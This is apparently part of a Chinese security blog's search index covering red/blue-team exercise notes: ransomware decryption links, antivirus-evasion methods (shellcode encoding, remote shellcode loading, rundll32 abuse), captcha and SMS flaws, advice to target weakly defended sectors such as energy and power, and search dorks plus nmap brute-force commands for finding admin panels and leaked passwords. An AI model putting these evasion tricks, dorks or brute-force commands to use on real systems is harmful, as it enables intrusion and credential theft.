","date":"2023-11-17","objectID":"/hvv_emergency_response/:10:3","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#文件对比工具"},{"categories":["hvv"],"content":"\r勒索病毒","date":"2023-11-17","objectID":"/hvv_emergency_response/:11:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#勒索病毒"},{"categories":["hvv"],"content":"\r勒索病毒搜索引擎 360：http://lesuobingdu.360.cn 腾讯：https://guanjia.qq.com/pr/ls 启明：https://lesuo.venuseye.com.cn 奇安信：https://lesuobingdu.qianxin.com 深信服：https://edr.sangfor.com.cn/#/information/ransom_search ","date":"2023-11-17","objectID":"/hvv_emergency_response/:11:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#勒索病毒搜索引擎"},{"categories":["hvv"],"content":"\r勒索软件解密工具集 腾讯哈勃：https://habo.qq.com/tool 金山毒霸：http://www.duba.net/dbt/wannacry.html 火绒：http://bbs.huorong.cn/forum-55-1.html 瑞星：http://it.rising.com.cn/fanglesuo/index.html Nomoreransom：https://www.nomoreransom.org/zh/index.html MalwareHunterTeam：https://id-ransomware.malwarehunterteam.com 卡巴斯基：https://noransom.kaspersky.com Avast：https://www.avast.com/zh-cn/ransomware-decryption-tools Emsisoft：https://www.emsisoft.com/ransomware-decryption-tools/free-download Github勒索病毒解密工具收集汇总：https://github.com/jiansiting/Decryption-Tools ","date":"2023-11-17","objectID":"/hvv_emergency_response/:11:2","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#勒索软件解密工具集"},{"categories":["hvv"],"content":"\r免杀，病毒分析免杀的话主要分为两种,一种是静态文件免杀,另一种是动态行为免杀 也有些师傅喜欢分为 二进制免杀(无源码),只能通过修改asm代码 二进制数据 其他数据来完成免杀 有源码的免杀,可以通过修改源代码来完成免杀,也可以结合二进制免杀的技术 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#免杀病毒分析"},{"categories":["hvv"],"content":"\r静态文件免杀a.特征码识别(病毒库在本地,模糊哈希匹配 b.云查杀(病毒库在云服务器 c.校验和法(本质还是特征码) d.启发式扫描,通过机械学系把家族病毒特征归纳,聚类 MYCCL查找特征码修改 找到杀软查杀的特征码，修改，替换，编码等等在不影响程序运行的情况下，把特征码改的面目全非，删掉也可以 加花指令 这是最有效也是最常用的方式，要点在于如何加话指令 对shellcode进行加密编码 比如在特定位置添加垃圾字符, 用硬编码的单字节密钥对字节进行异或加减法运算 把字节移位某些特定位置 交换连字节 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#静态文件免杀"},{"categories":["hvv"],"content":"\r动态行为免杀某些敏感操作监控 注册表 组策略 防火墙 敏感程序 各种win32api 文件夹 绕过方法的话就是 白加黑 让win的一些白文件去执行敏感操作 替换/找未导出的/重写/寻找底层api 替换调用顺序 通过调用其它进行功能来完成 API 的功能 比较经典的如，通过 rundll32.exe 来完成 dll 加载，通过 COM 来操作文件等等。 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:2","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#动态行为免杀"},{"categories":["hvv"],"content":"\r分离免杀 shellcode从文本提取 shellcode与加载器分离 远程加载shellcode（shellcode放在另一台主机上，走http协议下载） 管道运输 隐写在图片上，powershell加载 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:3","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#分离免杀"},{"categories":["hvv"],"content":"\r网站验证码利用点","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#网站验证码利用点"},{"categories":["hvv"],"content":"\r验证码无效有验证码模块,但是验证模块与业务功能没有关联性,此为无效验证,无论输入什么都正确 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#验证码无效"},{"categories":["hvv"],"content":"\r验证码由客户端生成 验证验证码由客户端js生成并且仅仅在客户端用js验证,通过抓包查看是否有验证码字段或者是关闭js看能否通过验证. ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:2","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#验证码由客户端生成-验证"},{"categories":["hvv"],"content":"\r验证码有回显验证码在html或者cookie中显示,或者输出到response headers的其他字段,可被直接查看 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:3","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#验证码有回显"},{"categories":["hvv"],"content":"\r验证码固定也叫验证码重复使用,是指验证码没有设置使用期限,在验证码首次认证成功后没有删除在session中的验证码,使得验证码可以被多次成功验证,从而造成危害. ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:4","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#验证码固定"},{"categories":["hvv"],"content":"\r验证码可以爆破服务端未对验证时间 次数做出限制,存在爆破的可能性,简单的系统存在可以直接爆破的可能性,但是做过一些防护的系统还得进行一些绕过才能进行爆破 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:5","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#验证码可以爆破"},{"categories":["hvv"],"content":"\r验证码可猜解验证码比较简单,可以通过推测猜到有哪些验证吗 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:6","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#验证码可猜解"},{"categories":["hvv"],"content":"\r可绕过","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:7","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#可绕过"},{"categories":["hvv"],"content":"\r图片验证吗burpsuite插件推荐： xp_captcha：https://github.com/smxiazi/NEW_xp_CAPTCHA\rcaptcha-kiler：https://github.com/c0ny1/captcha-killer/tags\rreCAPTCHA：https://github.com/bit4woo/reCAPTCHA/releases/tag/v1.0\r","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:8","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#图片验证吗"},{"categories":["hvv"],"content":"\r短信验证码","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#短信验证码"},{"categories":["hvv"],"content":"\r短信轰炸没有对发送短信验证码的发送时间 用户 ip做出限制 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:1","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#短信轰炸"},{"categories":["hvv"],"content":"\r任意用户密码重置https://blog.csdn.net/m0_47418965/article/details/121613640 https://www.freebuf.com/vuls/253833.html ","date":"2023-11-17","objectID":"/hvv_emergency_response/:1:2","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#任意用户密码重置"},{"categories":["hvv"],"content":"\rhvv日记：https://blog.csdn.net/m0_61101264/article/details/130811974?spm=1001.2101.3001.6650.9\u0026utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-9-130811974-blog-131134229.235%5Ev38%5Epc_relevant_anti_vip_base\u0026depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-9-130811974-blog-131134229.235%5Ev38%5Epc_relevant_anti_vip_base\u0026utm_relevant_index=10 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#hvv日记"},{"categories":["hvv"],"content":"\r参考资料：REEBUF《应急响应1入侵排查篇》 CN-SEC《【2022HVV系列】|7-Windows主机入侵痕迹排查办法》 ","date":"2023-11-17","objectID":"/hvv_emergency_response/:0:0","series":null,"tags":["hvv"],"title":"hvv_应急响应","uri":"/hvv_emergency_response/#参考资料"},{"categories":["hvv"],"content":"HVV专题–渗透实战项目案例 【渗透实战系列】|44-记一次授权渗透实战（过程曲折，Java getshell） 【渗透实战系列】|31-记一次对学校的渗透测试 【渗透实战系列】26|一记某cms审计过程(步骤详细) 渗透系列之打击彩票站 【渗透实战系列】｜13-waf绕过拿下赌博网站 一次攻防演练的实战分享 实战 | 记一次攻防演练中的溯源经历 记一次挖矿linux挖矿木马应急分析排查处置过程 ","date":"2023-11-17","objectID":"/hvv_penetration_testing/:0:0","series":null,"tags":["hvv"],"title":"hvv_渗透实战项目","uri":"/hvv_penetration_testing/#"},{"categories":["hvv"],"content":"HVV专题–红队外围打点 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:0:0","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#"},{"categories":["hvv"],"content":"\r红队概述：\r","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:1:0","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#红队概述"},{"categories":["hvv"],"content":"\r信息收集方式：一般采取以下几种方式在搜索引擎（如：baidu、google）进行搜索： 主站相关联的链接，主站链接下可能会放置跳转，如邮件、OA等相关系统。 主站子域名进行搜索，通过二级或三级域名进行目标搜索相关域名。 主目标相关title，主要为搜索一些没有设置域名只有相关IP的系统。 主目标相关body，这种搜索方式误报率比较高，通过一些条件可筛选出相关联系统。 C段探测，一般前几种搜索方式获取相关IP，然后探测可能存在的C段，可获取一些没有相关联信息的隐藏资产。 端口探测，扫描是否存在其他的web服务，或可利用的、可爆破的、未授权的端口等。 邮件账号收集，一般为发布在公网上招聘、联系方式等，然后可进行弱密码破解。 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:1:1","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#信息收集方式"},{"categories":["hvv"],"content":"\r主要进攻目标原则: 资产范围比较庞大。因为资产范围广，容易出现不被关注的系统，安全性可能存在疏忽，比较容易进行突破； 受关注比较低的。由于受到关注度高的系统，如果受到攻击，影响会比较大，安全性会比一般的高。所以需要选择受关注比较低的系统做为突破口； 没有与资金直接关系的系统。涉及资金交易的系统，安全性受到重视度最高，突破难度大，所以不选择； 安全管理不够完善的单位。安全管理不够完善的单位做为突破口，容易发现弱口令或密码相同，人员安全意识不高，容易利用钓鱼手段做为突破口； ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:1:2","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#主要进攻目标原则"},{"categories":["hvv"],"content":"\r三个阶段：第一阶段 定位好主要攻击目标后，一起寻找主要突破口，当成功撕开一个突破口后进入第二阶段； 第二阶段 由于刚撕开突破口，不宜动作太大，所以由主要攻击手进行内网探测信息收集，以及留后门工作，寻找其他跳板机；另外两人进行次要目标的寻求突破，当主攻手成功获取其他跳板机后，或者次要目标找到突破口进入第三阶段； 第三阶段 全力挖掘内网，尽量得分，寻求拿下任务目标系统。 攻击手段 主要是通过以下途径开展渗透攻击：一是通过SQL注入、文件上传漏洞等攻击方式，对目标系统开展攻击，获取系统权限；二是利用后台、用户弱口令漏洞，获取网络及信息系统关键信息；三是利用系统已知漏洞，直接获得系统服务器权限。 当攻陷的服务器处于内网之中，将进一步深入进行内网漫游。 由于不同目标防守方一般经过行业划分，所以防守实力强弱差距比较大。 防守方最强的为金融行业，毕竟与金钱有着直接关系的，受到关注度也是最高，安全投入最高，就算突破也很难获取大量得分，所以大多数攻方都不以金融行业为主要攻击目标。 其次防守比较强的行业为重要企业，由于企业对外网络服务的业务少，受众面不如政府、金融行业，再加上企业对安全管理比较重视，所以企业属于易守难攻类型。 防守比较薄弱的几个行业如下： 运输交通、政府公众服务类、能源矿产类、电力等这几类系统的特点： 资产庞大，业务系统驳杂、全国各地都有甚至到县城，容易被找到突破口。 没有统一的安全管理，由于庞大系统需要多个管理员一起维护，一旦有重大漏洞爆出往往会出现响应不及时的现象。例如：在互联网上传播最新漏洞信息，防守比较强的行业能在第一时间内修复漏洞或者找到临时应对的方法。而防守薄弱的可能，没有获取相关信息，或者在了解信息后，没有比较好的解决方法选择极端的防守方式关闭站点。 安全边界防护不严格，由于系统庞大系统需要布满全国各地，地方可能也会开放自己的业务系统，一旦一个地方被入侵成功，就可连通全国各地的内网，以点破面全部沦陷的风险。 排查攻击能力较弱。 例如：在内网中发现攻击或木马后门，防守强的行业能在发现后门后，分析出攻击的入侵点，并能锁定哪些资产可能被入侵进行彻底排查。而防守比较弱的队伍可能无法发现后门，或者无法彻底清除后门，导致在管理以为彻底修复问题后，内网仍然被入侵。 ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:1:3","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#三个阶段"},{"categories":["hvv"],"content":"\r正题：","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:0","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#正题"},{"categories":["hvv"],"content":"\r0x01 信息收集踩点 a b c 自动对词进行拆分匹配 拆分标准 空格 “a b c “ 把a b c 当成一个整体去查 ” a*b” *通配符 里面是一个或者多个 以a开头 b结尾 “ab” -c 找到ab 不包含c a and b 包含a和b “ab”(c|d) ab中可能包含c或者d intitle: xx 找标题 intext: xx 找内容 info: xx 搜索到关于一个URL的更多信息的页面列表，这里的信息包括这个网页的cache，还有与这个网页相似的网页等等 inurl: *.baidu.com 模糊搜索地址 inurl:phpmyadmin/index.php \u0026 (intext:username \u0026 password \u0026 “Welcome to”) inanchor:修改密码 锚点描述文本 filetype:pdf 搜索 cache:baidu.com 快照 历史信息 link:xxx.com 搜索所有链接有xxx.com 链接 site:*.baidu.com 搜索这个所有域名 related: xx.com 搜索相关网站 book: Lisa+CA phone电话簿查询美国街道地址和电话号码信息。例如 “phonebook:Lisa+CA”将查询名字里面包含”Lisa” 并住在加州的人的所有名字。 allinanchor 限制搜索结果必须是那些在anchor文字里包含了我们所有查询关键词的网页。 allintext 限制搜索结果仅仅是在网页正文里边包含了我们所有查询关键词的网页。 allintitle 限制搜索结果仅是那些在网页标题里边包含了我们所有查询关键词的网页。 allinurl 限制搜索结果仅是那些在URL（网址）里边包含了我们所有查询关键词的网页。 author 限制返回结果仅仅是那些在Google论坛里边，包含了特定作者的新闻文章。 bphonebook 用bphonebook进行查询的时候，返回结果将是那些商务电话资料。 datarange 将查询结果限制在一个特定的时间段内，这个时间相对于网站来说，是按网站被google收录的时间算的。 define 返回包含查询关键词定义的网面。 ext 用于filetype:查找扩散名为ext的文件。 group 限制我们的论坛查询结果仅是某几个固定的论坛组或是某些特定主题组的新闻文章。 id 又是一个没有证实的语法，效果很一般。 insubject 限制论坛搜索结果仅是那些在主题里边包含了查询关键词的网面。 location 当我们提交location进行Google新闻查询的时候，Google仅会返回你当前指定区的跟查询关键词相关的网页。 movie 用movie提交查询的时候，Google会返回跟查询关键词相关的电影信息。 phonebook 用phonebook进行查询的时候，Google会返回美国当地跟查询关键词相关的电话信息。 related 用related提交查询，Google会返回跟我们要查询的网站结构内容相似的一些其它网站。 rphonebook 查询用来搜索美国当地跟查询关键词相关的住宅电话信息。 safesearch 用safesearch提交查询的时候，Google会过滤你搜索的结果，其中过滤的内容可能包括一些色情的，暴力，赌博性质的，还有传染病毒的网页。但是它不是百分之百确保安全的。 source 用source提交查询的时候，Google新闻会限制我们的查询仅是那些我们指定了特定ID或新闻源的网址。 stocks 返回跟查询关键词相关的股票信息，这些信息一般来自于其它一些专业的财经网站。 store 查询的时候，Google Froogle仅会显示我们指定了store ID的结果。 tq 如果想查某个地方的天气如何,我们只要在Google搜索框中输入”城市名称 Tq”就可以查询到这个城市的天状况.例”北京 tq”,当然tq也可以用汉字的天气代替。 weather 用weather提交查询的时候，如果我们指出一个Google可以识别的地区或城市，Google会返回该地区或城市当前的天气状况。 Related:URL 搜索结果将展示与这个URL链接页面相关的页面。”相关”除了和该页面内容相关的页面外，还包括这个页面的导入链接和导出链接所指向的页面。 Ext “Ext:文件后缀”。它可以帮你搜索各种后缀格式的文件。比如说： xls (微软 Excel) ppt (微软 PowerPoint) doc (微软 Word) pdf (Adobe 文件) html or htm (HTML代码文件) Inanchor 搜索结果中必须出现以这个关键词为链接关键词的链接。 谷歌常用搜索语法： AND：缺一不可 OR：两者皆可 \"\"：为一个关键词 -：不包含某关键词 +：不忽略某关键词 “~”：同义词匹配搜索 “?”和“*”：占位通配符 关键字搜索 site：指定域名，如：site:edu.cn 搜索教育网站 inurl：用于搜索包含的url关键词的网页，如：inurl:login 搜索网址中含有login的网页 intitle：搜索网页标题中的关键字，如：intitle:“index of /admin” intext：搜索网页正文中的关键字，如：intext:登陆/注册/用户名/密码 filetype：按指定文件类型即文件后缀名搜索，如：filetpye:php/asp/jsp 查找后台 site:xx.com intext:管理|后台|登陆|用户名|密码|系统|帐号|admin|login|sys|managetem|password|username site:xx.com inurl:login|admin|manage|member|admin_login|login_admin|system|login|user 查找sql注入漏洞 inurl:.php?id=23 公司 inurl:.asp?id=11 查找上传点： site:xx.com inurl:file| uploadfile 查找敏感信息泄露 intitle:\"Index of /admin\" intitle:\"Index of /root\" intitle:\"Index of /\" +password.txt intitle:phpinfo()或者inurl:phpinfo.php 查找未授权访问phpmyadmin inurl:.php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:1","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x01-信息收集踩点"},{"categories":["hvv"],"content":"\r0x01 信息收集踩点 a b c 自动对词进行拆分匹配 拆分标准 空格 “a b c “ 把a b c 当成一个整体去查 ” a*b” *通配符 里面是一个或者多个 以a开头 b结尾 “ab” -c 找到ab 不包含c a and b 包含a和b “ab”(c|d) ab中可能包含c或者d intitle: xx 找标题 intext: xx 找内容 info: xx 搜索到关于一个URL的更多信息的页面列表，这里的信息包括这个网页的cache，还有与这个网页相似的网页等等 inurl: *.baidu.com 模糊搜索地址 inurl:phpmyadmin/index.php \u0026 (intext:username \u0026 password \u0026 “Welcome to”) inanchor:修改密码 锚点描述文本 filetype:pdf 搜索 cache:baidu.com 快照 历史信息 link:xxx.com 搜索所有链接有xxx.com 链接 site:*.baidu.com 搜索这个所有域名 related: xx.com 搜索相关网站 book: Lisa+CA phone电话簿查询美国街道地址和电话号码信息。例如 “phonebook:Lisa+CA”将查询名字里面包含”Lisa” 并住在加州的人的所有名字。 allinanchor 限制搜索结果必须是那些在anchor文字里包含了我们所有查询关键词的网页。 allintext 限制搜索结果仅仅是在网页正文里边包含了我们所有查询关键词的网页。 allintitle 限制搜索结果仅是那些在网页标题里边包含了我们所有查询关键词的网页。 allinurl 限制搜索结果仅是那些在URL（网址）里边包含了我们所有查询关键词的网页。 author 限制返回结果仅仅是那些在Google论坛里边，包含了特定作者的新闻文章。 bphonebook 用bphonebook进行查询的时候，返回结果将是那些商务电话资料。 datarange 将查询结果限制在一个特定的时间段内，这个时间相对于网站来说，是按网站被google收录的时间算的。 define 返回包含查询关键词定义的网面。 ext 用于filetype:查找扩散名为ext的文件。 group 限制我们的论坛查询结果仅是某几个固定的论坛组或是某些特定主题组的新闻文章。 id 又是一个没有证实的语法，效果很一般。 insubject 限制论坛搜索结果仅是那些在主题里边包含了查询关键词的网面。 location 当我们提交location进行Google新闻查询的时候，Google仅会返回你当前指定区的跟查询关键词相关的网页。 movie 用movie提交查询的时候，Google会返回跟查询关键词相关的电影信息。 phonebook 用phonebook进行查询的时候，Google会返回美国当地跟查询关键词相关的电话信息。 related 用related提交查询，Google会返回跟我们要查询的网站结构内容相似的一些其它网站。 rphonebook 查询用来搜索美国当地跟查询关键词相关的住宅电话信息。 safesearch 用safesearch提交查询的时候，Google会过滤你搜索的结果，其中过滤的内容可能包括一些色情的，暴力，赌博性质的，还有传染病毒的网页。但是它不是百分之百确保安全的。 source 用source提交查询的时候，Google新闻会限制我们的查询仅是那些我们指定了特定ID或新闻源的网址。 stocks 返回跟查询关键词相关的股票信息，这些信息一般来自于其它一些专业的财经网站。 store 查询的时候，Google Froogle仅会显示我们指定了store ID的结果。 tq 如果想查某个地方的天气如何,我们只要在Google搜索框中输入”城市名称 Tq”就可以查询到这个城市的天状况.例”北京 tq”,当然tq也可以用汉字的天气代替。 weather 用weather提交查询的时候，如果我们指出一个Google可以识别的地区或城市，Google会返回该地区或城市当前的天气状况。 Related:URL 搜索结果将展示与这个URL链接页面相关的页面。”相关”除了和该页面内容相关的页面外，还包括这个页面的导入链接和导出链接所指向的页面。 Ext “Ext:文件后缀”。它可以帮你搜索各种后缀格式的文件。比如说： xls (微软 Excel) ppt (微软 PowerPoint) doc (微软 Word) pdf (Adobe 文件) html or htm (HTML代码文件) Inanchor 搜索结果中必须出现以这个关键词为链接关键词的链接。 谷歌常用搜索语法： AND：缺一不可 OR：两者皆可 \"\"：为一个关键词 -：不包含某关键词 +：不忽略某关键词 “~”：同义词匹配搜索 “?”和“*”：占位通配符 关键字搜索 site：指定域名，如：site:edu.cn 搜索教育网站 inurl：用于搜索包含的url关键词的网页，如：inurl:login 搜索网址中含有login的网页 intitle：搜索网页标题中的关键字，如：intitle:“index of /admin” intext：搜索网页正文中的关键字，如：intext:登陆/注册/用户名/密码 filetype：按指定文件类型即文件后缀名搜索，如：filetpye:php/asp/jsp 查找后台 site:xx.com intext:管理|后台|登陆|用户名|密码|系统|帐号|admin|login|sys|managetem|password|username site:xx.com inurl:login|admin|manage|member|admin_login|login_admin|system|login|user 查找sql注入漏洞 inurl:.php?id=23 公司 inurl:.asp?id=11 查找上传点： site:xx.com inurl:file| uploadfile 查找敏感信息泄露 intitle:\"Index of /admin\" intitle:\"Index of /root\" intitle:\"Index of /\" +password.txt intitle:phpinfo()或者inurl:phpinfo.php 查找未授权访问phpmyadmin inurl:.php? intext:CHARACTER_SETS,COLLATIONS, ?intitle:phpmyadmin ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:1","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#谷歌常用搜索语法"},{"categories":["hvv"],"content":"\r0x02 GitHub 信息收集 数据库信息泄露 site:github.com root password site:github.com sa password site:github.com User ID=’sa’;Password svn信息泄露 site:github.com svn site:github.com svn password site:github.com svn username site:github.com svn username password 数据库备份文件 site:github.com inurl:sql 综合信息泄露 site:github.com password site:github.com ftp ftppassword site:github.com 密码 site:github.com 内部 Github 信息收集 https://github.com/michenriksen/gitrob https://securitytrails.com/blog/github-dorks ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:2","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x02-github-信息收集"},{"categories":["hvv"],"content":"\r0x03 搜索空间信息收集子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ FOFA常用语法： 1、domain= \"qq.com\" //搜索qq.com所有的子域名 2、host=\"edu.cn\" //从url中搜索edu.cn 3、ip= \"11.1.1.1\" //搜索ip 4、server=\"apache\" //搜索服务是apache的网站 5、os=\"windows\" //搜素操作系统是windows的网站 6、port=3306 或者 protocol==\"mysql\" //搜索mysql数据库的网站 7、app=\"致远\" //搜索致远oa办公系统搭建的网站 8、title=\"登陆\" //从标题中搜索登陆 9、header=\"thinkphp\" //从http的头里面搜thinkphp ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:3","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x03-搜索空间信息收集"},{"categories":["hvv"],"content":"\r0x03 搜索空间信息收集子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城等，其他管理系统，网站管理后台等较少出现在子域名中。 首先找到目标站点，在官网中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下页面底部，也许有管理后台等收获。 查找目标域名信息的方法： 名称 用法或地址 FOFA title=”公司名称” 钟馗之眼 site=域名即可 百度 intitle=公司名称 Google intitle=公司名称 FOFA搜索子域名 https://fofa.so/ 语法：domain=”baidu.com” Hackertarget查询子域名 https://hackertarget.com/find-dns-host-records/ 注意：查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。 站长之家，直接搜索名称或者网站域名 http://tool.chinaz.com/ 钟馗之眼，直接搜索名称或网站名称 https://www.zoomeye.org/ FOFA常用语法： 1、domain= \"qq.com\" //搜索qq.com所有的子域名 2、host=\"edu.cn\" //从url中搜索edu.cn 3、ip= \"11.1.1.1\" //搜索ip 4、server=\"apache\" //搜索服务是apache的网站 5、os=\"windows\" //搜素操作系统是windows的网站 6、port=3306 或者 protocol==\"mysql\" //搜索mysql数据库的网站 7、app=\"致远\" //搜索致远oa办公系统搭建的网站 8、title=\"登陆\" //从标题中搜索登陆 9、header=\"thinkphp\" //从http的头里面搜thinkphp ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:3","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#fofa常用语法"},{"categories":["hvv"],"content":"\r0x04 端口、邮箱、备案收集 名称 地址或命令 Tag1-Nmap端口扫描 nmap -sS -T4 -Pn –open -n -p- -iL ***.txt -oX *** 小蓝本 https://www.xiaolanben.com/ ThreatScan https://scan.top15.cn/web/ 邮箱收集 https://www.email-format.com/ 注册edu邮箱 往下面看当前0x03 的PS的内容 奇怪域名收集 https://archive.org/web/ Aquatone —子域名截图 https://github.com/michenriksen/aquatone Github 收集 “.com” login “.com” ftp “.com” password “.com” token 图标hash搜索 1. 平台 2. 领英3. 脉脉 4. 新媒体资产5. 抓公众号、小程序链接，能发现一堆奇奇怪怪的资产；还有抖音，支付宝商号等等 Fuzz 资产存活，但却访问不了，是因为目录不正确，收集一个高命中率的资产字典进行fuzz Hosts碰撞 https://github.com/r35tart/Hosts_scan用于碰撞某些绑定了host的域名进行强制匹配进行访问，跟改了本地host文件一样 JS分析 网页的JS中往往存在着奇奇怪怪的URL，里面有些参数说不定也有，意想不到的接口泄露 推荐工具JSfinderhttps://github.com/Threezh1/JSFinder 客服窗口 为什么此处会说客户窗口？说不定能弹个XSS，在打点的时候可以用此处知道客户的后台地址和Cookie Crunchbase Crunchbase是一个以Web 2.0方式表达的创业公司数据库，包含了创始人，关键雇员，财务状况，收购新闻以及其他重要事件 https://www.crunchbase.com ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:4","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x04-端口邮箱备案收集"},{"categories":["hvv"],"content":"\r0x05 端口检测 名称 地址 在线端口检测 http://coolaf.com/tool/port 扫描主机端口 nmap -T5 -A -v -p- 扫描一个IP段，探测存活主机 nmap -sP 探测操作系统类型 nmap -0 寻找登录授权页面 nmap -p 80 –script http-auth-finder \u003cwww.xxx.com\u003e SSH爆破 nmap -p22 –script ssh-brute dns 域传送漏洞 nmap -p 53 –script dns-zone-transfer.nse -v Masscan Masscan 127.0.0.0/24 -p443 # 单端口扫描 Masscan Masscan 127.0.0.0/24 –top-ports 100 -rate 100000 # 快速扫描 Masscan Masscan 127.0.0.0/24 –top-ports 100 –excludefile exclude.txt # 排除指定目标 Masscan Masscan 127.0.0.0/24 -p20,21,22,23,80,161,443,873,2181,3389,6379,7001,8000,8009,8080,9000,9009,9090,9200,9300,10000,50070 \u003e results.txt ","date":"2023-11-17","objectID":"/hvv_redteam_information_collection/:2:5","series":null,"tags":["hvv"],"title":"hvv_红队外围信息收集","uri":"/hvv_redteam_information_collection/#0x05-端口检测"},{"categories":["hvv"],"content":"\r0x06 邮箱收集技巧\r使用邮箱地址查找工具· 批量邮箱验证 1）Clearbit Connect：可免费访问，每月免费搜索上限100个； 2）Hunter：每月免费搜索上限100个，付费每月49美元起，每月搜索上限1000个起； 3）Findanyemail 2.0：每月免费搜索上限100个，付费每月49美元起，每月搜索上限5000个起； 4）toofr：首次使用可免费搜索30个，之后每月19美元，每月搜索上限2500个起； 5）Voila Norbert：首次使用可免费搜索30个，之后每月49美元起，每月搜索上限1000个起； 6）Anymail finder：首次使用可免费搜索20个，之后每月18美元起，每月搜索上限200个起； 7）Find That Email：首次使用可免费搜索15个，之后每月19美元起，每月搜索上限500个起； 8）Snovio 查看三度人脉以内的邮箱 9）Rapportive 输入邮箱或者将鼠标悬浮在Gmail中任意一个联系人的邮箱，此工具会立马给出相应联系人的详细LinkedIn个人资料信息 10）Emailmatcher：无限免费搜索。 11）SellHack：输入名称和域名，然后扫描邮件服务器以查找所有匹配的电子邮件地址。替代品：Clearbit · 性格+其它收集 Crystal 